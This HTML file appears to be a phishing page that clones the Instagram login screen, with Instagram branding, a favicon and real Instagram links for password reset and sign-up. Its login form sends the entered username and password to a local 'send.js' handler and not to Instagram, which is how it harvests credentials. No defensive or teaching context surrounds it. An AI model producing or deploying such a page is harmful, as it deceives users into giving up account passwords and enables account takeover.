<html>

<head>
    <title>Instagram</title>
    <meta charset="utf-8">
    <meta name="viewport" content=" width=device-width,initial-scale=1.0">
    <meta http-equiv="refresh" content="60">
    <link rel="icon" href="images/favicon.png" type="image/icon">
    <link rel="stylesheet" type="text/css" href="style.css">

</head>

<body>
    <div class="container">
        <div class="page">
            <div class="logo">

                <img src="images/instagram.png" alt="instagram" style="width: 175px; ">
            </div>

            <br />
            <form action="send.js" method="post">
                <input type="text" name="username" placeholder="Phone number, username, or email ">
                <input type="password" placeholder="Password" name="password">
                <button type="submit">login</button>
              </form>              
                <br />
                <div class="option">OR </div>
            </form>

            <div class="fblink">
                <span class="fab fafacebook"></span>
                <a href="#"> Log in With Facebook</a>
            </div>

            <div class="forget-id">
                <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
            </div>
            <div class="singup">
                <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">
                        Sign up</a></p>
            </div>

        </div>
    </div>

</body>

</html>
